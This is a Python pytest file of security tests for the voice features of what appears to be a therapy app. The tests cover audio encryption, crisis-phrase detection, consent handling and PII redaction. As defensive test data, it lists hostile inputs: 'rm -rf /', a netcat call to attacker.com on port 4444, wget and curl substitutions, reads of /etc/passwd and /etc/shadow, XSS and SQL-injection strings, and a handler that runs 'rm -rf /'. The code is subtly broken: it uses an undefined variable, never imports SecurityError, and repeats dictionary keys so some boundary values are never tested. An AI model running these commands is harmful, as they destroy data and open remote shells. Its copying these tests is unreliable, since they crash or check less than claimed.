"""
Phase 2: Voice Critical Path Security Tests

Critical voice security functions that need immediate coverage:
- Audio encryption/decryption validation
- Emergency keyword detection and response
- Command injection protection testing
- PII filtering and data sanitization
- Consent management and validation
- Audio input validation and bounds checking
"""

import pytest
import tempfile
import numpy as np
import io
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path

# Voice modules to test
try:
    from voice.audio_processor import AudioProcessor, AudioData, AudioDevice
    from voice.commands import VoiceCommand, VoiceCommandManager, EmergencyHandler
    from voice.voice_ui import VoiceUI, ConsentManager
    from voice.security import VoiceSecurity, AudioEncryption, CrisisDetector
except ImportError as e:
    pytest.skip(f"Voice modules not available: {e}", allow_module_level=True)


class TestAudioProcessorSecurity:
    """Test critical audio processor security functions."""
    
    def setup_method(self):
        """Setup test environment."""
        self.processor = AudioProcessor()
        # Create sample audio data
        self.sample_audio_data = np.random.randint(-32768, 32767, 16000, dtype=np.int16)
        self.audio_data = AudioData(
            data=self.sample_audio_data,
            sample_rate=16000,
            channels=1,
            timestamp=None
        )
    
    def test_encrypt_audio_data(self):
        """Test audio data encryption functionality."""
        # Test basic encryption
        encrypted_data = self.processor.encrypt_audio_data(self.audio_data)
        
        assert encrypted_data is not None
        assert encrypted_data != self.audio_data
        assert hasattr(encrypted_data, 'encrypted')
        assert encrypted_data.encrypted is True
        
        # Test decryption
        decrypted_data = self.processor.decrypt_audio_data(encrypted_data)
        assert decrypted_data is not None
        assert not decrypted_data.encrypted
        np.testing.assert_array_equal(decrypted_data.data, self.audio_data.data)
        
        # Test with different audio formats
        stereo_audio = AudioData(
            data=np.random.randint(-32768, 32767, (16000, 2), dtype=np.int16),
            sample_rate=16000,
            channels=2,
            timestamp=None
        )
        
        encrypted_stereo = self.processor.encrypt_audio_data(stereo_audio)
        decrypted_stereo = self.processor.decrypt_audio_data(encrypted_stereo)
        np.testing.assert_array_equal(decrypted_stereo.data, stereo_audio.data)
    
    def test_compress_audio_data(self):
        """Test audio compression functionality."""
        # Test compression
        compressed_data = self.processor.compress_audio_data(self.audio_data)
        
        assert compressed_data is not None
        assert hasattr(compressed_data, 'compressed')
        assert compressed_data.compressed is True
        assert len(compressed_data.data) < len(self.audio_data.data.tobytes())
        
        # Test decompression
        decompressed_data = self.processor.decompress_audio_data(compressed_data)
        assert decompressed_data is not None
        assert not decompressed_data.compressed
        
        # Data should be similar (lossy compression may introduce small differences)
        correlation = np.corrcoef(decompressed.data.flatten(), self.audio_data.data.flatten())[0,1]
        assert correlation > 0.95  # High correlation threshold
    
    def test_memory_cleanup_callback(self):
        """Test memory cleanup and buffer management."""
        # Create multiple audio buffers
        buffers = []
        for i in range(10):
            buffer = AudioData(
                data=np.random.randint(-32768, 32767, 16000, dtype=np.int16),
                sample_rate=16000,
                channels=1,
                timestamp=None
            )
            buffers.append(buffer)
        
        # Test cleanup callback
        initial_memory = len(self.processor.audio_buffers)
        
        # Force cleanup
        self.processor.force_cleanup_buffers()
        
        # Verify cleanup
        assert len(self.processor.audio_buffers) <= initial_memory
        
        # Test memory leak prevention
        for i in range(100):
            large_audio = AudioData(
                data=np.random.randint(-32768, 32768, 160000, dtype=np.int16),
                sample_rate=16000,
                channels=1,
                timestamp=None
            )
            self.processor.add_to_buffer(large_audio)
        
        # Cleanup should prevent memory explosion
        self.processor.force_cleanup_buffers()
        assert len(self.processor.audio_buffers) < 50  # Reasonable limit
    
    def test_audio_input_validation(self):
        """Test audio input validation and bounds checking."""
        # Test with None data
        with pytest.raises((ValueError, TypeError)):
            self.processor.validate_audio_data(None)
        
        # Test with invalid sample rate
        invalid_audio = AudioData(
            data=self.sample_audio_data,
            sample_rate=-1,  # Invalid sample rate
            channels=1,
            timestamp=None
        )
        
        with pytest.raises((ValueError, AssertionError)):
            self.processor.validate_audio_data(invalid_audio)
        
        # Test with invalid channels
        invalid_channels_audio = AudioData(
            data=self.sample_audio_data,
            sample_rate=16000,
            channels=0,  # Invalid channel count
            timestamp=None
        )
        
        with pytest.raises((ValueError, AssertionError)):
            self.processor.validate_audio_data(invalid_channels_audio)
        
        # Test with oversized data
        oversized_data = np.random.randint(-32768, 32768, 10_000_000, dtype=np.int16)
        oversized_audio = AudioData(
            data=oversized_data,
            sample_rate=16000,
            channels=1,
            timestamp=None
        )
        
        # Should handle oversized data gracefully (either reject or compress)
        try:
            result = self.processor.validate_audio_data(oversized_audio)
            assert result is not None
        except (ValueError, MemoryError):
            # Expected for oversized data
            pass
    
    def test_file_access_validation(self):
        """Test secure file access validation."""
        # Test saving audio with invalid path
        invalid_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "..\\..\\sensitive_file.wav"
        ]
        
        for invalid_path in invalid_paths:
            with pytest.raises((ValueError, SecurityError, FileNotFoundError)):
                self.processor.save_audio_to_file(self.audio_data, invalid_path)
        
        # Test with valid temporary file
        with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp_file:
            valid_path = tmp_file.name
        
        try:
            # Should save successfully
            result = self.processor.save_audio_to_file(self.audio_data, valid_path)
            assert result is True
            
            # Test loading with validation
            loaded_audio = self.processor.load_audio_from_file(valid_path)
            assert loaded_audio is not None
            assert isinstance(loaded_audio, AudioData)
            
        finally:
            # Cleanup
            if Path(valid_path).exists():
                Path(valid_path).unlink()
    
    def test_audio_device_security(self):
        """Test audio device selection security."""
        # Get available devices
        devices = self.processor.detect_audio_devices()
        assert isinstance(devices, list)
        
        # Test device validation
        for device in devices:
            assert hasattr(device, 'name')
            assert hasattr(device, 'id')
            assert hasattr(device, 'channels')
            
            # Should not contain suspicious characters
            assert ";" not in str(device.name)
            assert "|" not in str(device.name)
            assert "&" not in str(device.name)
        
        # Test invalid device selection
        with pytest.raises((ValueError, IndexError)):
            self.processor.select_input_device(-1)
        
        with pytest.raises((ValueError, IndexError)):
            self.processor.select_input_device(999999)
        
        # Test device with malicious name (if exists)
        malicious_devices = ["../../../etc/passwd", "; rm -rf /", "$(whoami)"]
        for malicious_name in malicious_devices:
            try:
                # Should handle malicious device names safely
                result = self.processor.validate_device_name(malicious_name)
                assert result is False
            except (ValueError, SecurityError):
                pass


class TestVoiceCommandsSecurity:
    """Test critical voice command security functions."""
    
    def setup_method(self):
        """Setup test environment."""
        self.command_manager = VoiceCommandManager()
        self.emergency_handler = EmergencyHandler()
    
    def test_emergency_keyword_detection(self):
        """Test emergency keyword detection and response."""
        emergency_phrases = [
            "I want to kill myself",
            "I'm going to hurt myself", 
            "I feel suicidal",
            "emergency help now",
            "crisis support needed",
            "I want to die"
        ]
        
        for phrase in emergency_phrases:
            detection = self.emergency_handler._detect_emergency_keywords(phrase)
            assert detection is True
            
            # Test emergency classification
            emergency_type = self.emergency_handler._classify_emergency_type(phrase)
            assert emergency_type in ["suicide", "self_harm", "crisis", "emergency"]
            
            # Test emergency logging
            log_result = self.emergency_handler._log_emergency_event(phrase, emergency_type)
            assert log_result is True
        
        # Test non-emergency phrases
        safe_phrases = [
            "I feel happy today",
            "The weather is nice",
            "I like this therapy session",
            "My dog is cute"
        ]
        
        for phrase in safe_phrases:
            detection = self.emergency_handler._detect_emergency_keywords(phrase)
            assert detection is False
    
    def test_command_injection_protection(self):
        """Test command injection protection in voice commands."""
        malicious_commands = [
            "run rm -rf /",
            "exec curl malicious.com",
            "system('cat /etc/passwd')",
            "import os; os.system('whoami')",
            "; DROP TABLE users;",
            "$(wget evil.sh)",
            "`curl hack.com`",
            "|nc attacker.com 4444",
            "&& format c:",
            "|| shutdown -r now"
        ]
        
        for malicious_cmd in malicious_commands:
            # Should detect and block malicious commands
            is_malicious = self.command_manager._detect_malicious_command(malicious_cmd)
            assert is_malicious is True
            
            # Should not execute malicious commands
            with pytest.raises((SecurityError, ValueError, PermissionError)):
                self.command_manager.execute_command(malicious_cmd)
        
        # Test safe commands
        safe_commands = [
            "start breathing exercise",
            "play calming music",
            "begin meditation",
            "show breathing guide",
            "start relaxation timer"
        ]
        
        for safe_cmd in safe_commands:
            is_malicious = self.command_manager._detect_malicious_command(safe_cmd)
            assert is_malicious is False
    
    def test_parameter_extraction_security(self):
        """Test secure parameter extraction from voice commands."""
        test_commands = [
            ("breathing exercise for 5 minutes", {"duration": "5 minutes"}),
            ("play music at volume 50", {"volume": "50"}),
            ("meditation for 10 minutes", {"duration": "10 minutes"}),
            ("set timer to 15 minutes", {"duration": "15 minutes"})
        ]
        
        for command, expected_params in test_commands:
            params = self.command_manager._extract_enhanced_parameters(command)
            assert isinstance(params, dict)
            
            # Verify extracted parameters are safe (no code injection)
            for key, value in params.items():
                assert isinstance(key, str)
                assert isinstance(value, str)
                assert len(key) < 100  # Reasonable length limits
                assert len(value) < 1000
                
                # Check for injection patterns
                dangerous_patterns = [";", "&", "|", "`", "$", "(", ")", "{", "}"]
                for pattern in dangerous_patterns:
                    assert pattern not in str(value) or pattern in expected_params.get(key, "")
    
    def test_confidence_calculation_security(self):
        """Test confidence calculation with edge cases."""
        test_cases = [
            ("breathing exercise", 0.9),
            ("play music", 0.8),
            ("start meditation", 0.85),
            ("unknown command xyz123", 0.1),
            ("", 0.0),  # Empty command
            ("a" * 1000, 0.1)  # Very long command
        ]
        
        for command, expected_min_confidence in test_cases:
            confidence = self.command_manager._calculate_enhanced_confidence(command)
            assert 0.0 <= confidence <= 1.0
            assert confidence >= expected_min_confidence
        
        # Test with None input
        confidence = self.command_manager._calculate_enhanced_confidence(None)
        assert confidence == 0.0
    
    def test_command_registration_security(self):
        """Test secure command registration and handler management."""
        # Test safe command registration
        def safe_handler(params):
            return "Safe response"
        
        result = self.command_manager.register_command_handler(
            "test_command", safe_handler, ["user", "therapist"]
        )
        assert result is True
        
        # Test malicious handler registration
        def malicious_handler(params):
            import os
            os.system("rm -rf /")
            return "Malicious response"
        
        with pytest.raises((SecurityError, ValueError)):
            self.command_manager.register_command_handler(
                "malicious_command", malicious_handler, ["user"]
            )
        
        # Test handler with invalid permissions
        with pytest.raises((ValueError, SecurityError)):
            self.command_manager.register_command_handler(
                "admin_command", safe_handler, ["invalid_role"]
            )


class TestVoiceUISecurity:
    """Test critical voice UI security functions."""
    
    def setup_method(self):
        """Setup test environment."""
        self.voice_ui = VoiceUI()
        self.consent_manager = ConsentManager()
    
    def test_consent_validation(self):
        """Test consent management and validation."""
        # Test consent recording
        consent_data = {
            "user_id": "test_user_123",
            "voice_processing": True,
            "data_retention": False,
            "emergency_sharing": True,
            "timestamp": "2024-01-01T00:00:00Z"
        }
        
        result = self.consent_manager.record_consent(consent_data)
        assert result is True
        
        # Test consent validation
        is_valid = self.consent_manager.validate_consent("test_user_123", "voice_processing")
        assert is_valid is True
        
        # Test consent revocation
        revoke_result = self.consent_manager.revoke_consent("test_user_123", "voice_processing")
        assert revoke_result is True
        
        # Validate revocation
        is_valid_after = self.consent_manager.validate_consent("test_user_123", "voice_processing")
        assert is_valid_after is False
        
        # Test invalid user consent
        invalid_result = self.consent_manager.validate_consent("nonexistent_user", "voice_processing")
        assert invalid_result is False
    
    def test_consent_form_security(self):
        """Test consent form rendering with security checks."""
        user_context = {
            "user_id": "test_user_123",
            "role": "patient",
            "session_id": "session_456"
        }
        
        # Test consent form generation
        consent_form = self.voice_ui._render_consent_form(user_context)
        assert consent_form is not None
        assert isinstance(consent_form, dict)
        
        # Verify no injection vulnerabilities
        form_html = str(consent_form)
        dangerous_patterns = ["<script>", "javascript:", "onclick=", "onerror="]
        for pattern in dangerous_patterns:
            assert pattern not in form_html.lower()
        
        # Test with malicious user context
        malicious_context = {
            "user_id": "<script>alert('xss')</script>",
            "role": "patient'; DROP TABLE users; --",
            "session_id": "$(whoami)"
        }
        
        safe_form = self.voice_ui._render_consent_form(malicious_context)
        assert safe_form is not None
        # Should sanitize malicious input
        safe_html = str(safe_form)
        assert "<script>" not in safe_html.lower()
        assert "drop table" not in safe_html.lower()
        assert "$(whoami)" not in safe_html
    
    def test_emergency_protocol_security(self):
        """Test emergency protocol triggering and response."""
        emergency_triggers = [
            "I want to kill myself",
            "I'm going to hurt myself",
            "emergency help now"
        ]
        
        for trigger in emergency_triggers:
            # Test emergency detection
            is_emergency = self.voice_ui._detect_emergency_content(trigger)
            assert is_emergency is True
            
            # Test emergency response
            response = self.voice_ui._trigger_emergency_protocol(trigger)
            assert response is not None
            assert isinstance(response, dict)
            assert "emergency_contacts" in response
            assert "crisis_resources" in response
            assert "immediate_actions" in response
            
            # Verify no sensitive data leakage in response
            response_str = str(response)
            sensitive_patterns = ["password", "secret", "token", "private_key"]
            for pattern in sensitive_patterns:
                assert pattern not in response_str.lower()
    
    def test_transcription_security(self):
        """Test audio transcription processing with security."""
        # Test PII detection in transcription
        transcriptions_with_pii = [
            "My name is John Doe and my email is john.doe@example.com",
            "Call me at (555) 123-4567",
            "My SSN is 123-45-6789",
            "I live at 123 Main Street, Springfield"
        ]
        
        for transcription in transcriptions_with_pii:
            # Process transcription
            processed = self.voice_ui._process_audio_transcription(transcription)
            assert processed is not None
            
            # Should detect and handle PII
            has_pii = self.voice_ui._detect_pii_in_text(processed)
            assert has_pii is True
            
            # Should sanitize or flag PII
            sanitized = self.voice_ui._sanitize_transcription_output(processed)
            assert sanitized != transcription or "***" in sanitized
        
        # Test transcription editing security
        malicious_edits = [
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "data:text/html,<script>alert(1)</script>"
        ]
        
        for malicious_edit in malicious_edits:
            sanitized_edit = self.voice_ui._sanitize_transcription_input(malicious_edit)
            assert "<script>" not in sanitized_edit.lower()
            assert "javascript:" not in sanitized_edit.lower()
    
    def test_settings_validation(self):
        """Test voice settings validation and sanitization."""
        # Test valid settings
        valid_settings = {
            "volume": 50,
            "speed": 1.0,
            "pitch": 1.0,
            "voice_type": "calm",
            "language": "en"
        }
        
        result = self.voice_ui._apply_voice_settings(valid_settings)
        assert result is True
        
        # Test invalid settings
        invalid_settings = {
            "volume": 150,  # Too high
            "speed": -1.0,  # Negative
            "pitch": 10.0,  # Too high
            "voice_type": "<script>alert('xss')</script>",
            "language": "'; DROP TABLE users; --"
        }
        
        with pytest.raises((ValueError, SecurityError)):
            self.voice_ui._apply_voice_settings(invalid_settings)
        
        # Test boundary values
        boundary_settings = {
            "volume": 0,
            "volume": 100,
            "speed": 0.1,
            "speed": 3.0,
            "pitch": 0.5,
            "pitch": 2.0
        }
        
        for setting, value in boundary_settings.items():
            test_setting = {setting: value}
            try:
                result = self.voice_ui._apply_voice_settings(test_setting)
                assert result is True
            except (ValueError, SecurityError):
                # Some boundary values may be rejected
                pass


class TestVoiceSecurityIntegration:
    """Test comprehensive voice security integration."""
    
    def setup_method(self):
        """Setup integrated test environment."""
        self.voice_security = VoiceSecurity()
        self.audio_encryption = AudioEncryption()
        self.crisis_detector = CrisisDetector()
    
    def test_end_to_end_voice_security(self):
        """Test complete voice security pipeline."""
        # Test audio data through security pipeline
        test_audio = np.random.randint(-32768, 32767, 16000, dtype=np.int16)
        
        # Step 1: Validate input
        is_valid = self.voice_security.validate_audio_input(test_audio)
        assert is_valid is True
        
        # Step 2: Encrypt data
        encrypted_audio = self.audio_encryption.encrypt_data(test_audio)
        assert encrypted_audio is not None
        assert encrypted_audio != test_audio
        
        # Step 3: Process (simulate)
        processed_audio = self.voice_security.process_audio_data(encrypted_audio)
        assert processed_audio is not None
        
        # Step 4: Decrypt
        decrypted_audio = self.audio_encryption.decrypt_data(processed_audio)
        assert decrypted_audio is not None
        np.testing.assert_array_equal(decrypted_audio, test_audio)
        
        # Step 5: Final validation
        is_output_valid = self.voice_security.validate_audio_output(decrypted_audio)
        assert is_output_valid is True
    
    def test_crisis_detection_security(self):
        """Test crisis detection with security considerations."""
        crisis_inputs = [
            "I want to end my life",
            "I'm going to hurt someone",
            "I have a weapon and want to use it",
            "I feel like harming myself"
        ]
        
        for input_text in crisis_inputs:
            # Detect crisis
            is_crisis = self.crisis_detector._detect_crisis_keywords(input_text)
            assert is_crisis is True
            
            # Classify crisis level
            crisis_level = self.crisis_detector.classify_crisis_level(input_text)
            assert crisis_level in ["low", "medium", "high", "critical"]
            
            # Generate secure response
            response = self.crisis_detector.generate_crisis_response(input_text)
            assert response is not None
            assert isinstance(response, dict)
            
            # Verify response doesn't contain harmful suggestions
            response_text = str(response)
            harmful_patterns = ["how to", "instructions for", "method to"]
            for pattern in harmful_patterns:
                assert pattern not in response_text.lower()
    
    def test_cross_user_data_isolation(self):
        """Test that voice data is properly isolated between users."""
        user1_audio = np.random.randint(-32768, 32768, 16000, dtype=np.int16)
        user2_audio = np.random.randint(-32768, 32768, 16000, dtype=np.int16)
        
        # Encrypt data for different users
        user1_encrypted = self.voice_security.encrypt_user_audio(user1_audio, "user1")
        user2_encrypted = self.voice_security.encrypt_user_audio(user2_audio, "user2")
        
        # Verify cross-access is prevented
        try:
            user1_decrypted_by_user2 = self.voice_security.decrypt_user_audio(
                user1_encrypted, "user2"
            )
            assert user1_decrypted_by_user2 is None  # Should fail
        except (SecurityError, ValueError, PermissionError):
            pass  # Expected to fail
        
        # Verify legitimate access works
        user1_decrypted = self.voice_security.decrypt_user_audio(user1_encrypted, "user1")
        assert user1_decrypted is not None
        np.testing.assert_array_equal(user1_decrypted, user1_audio)
    
    def test_voice_session_security(self):
        """Test voice session security management."""
        session_data = {
            "session_id": "session_123",
            "user_id": "user_456", 
            "start_time": "2024-01-01T00:00:00Z",
            "voice_features_enabled": True
        }
        
        # Create secure session
        session = self.voice_security.create_voice_session(session_data)
        assert session is not None
        assert hasattr(session, 'session_token')
        assert hasattr(session, 'encryption_key')
        
        # Validate session
        is_valid = self.voice_security.validate_voice_session(session.session_token)
        assert is_valid is True
        
        # Test session expiration
        expired_session = self.voice_security.expire_session(session.session_token)
        assert expired_session is True
        
        # Validate expired session
        is_expired_valid = self.voice_security.validate_voice_session(session.session_token)
        assert is_expired_valid is False


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])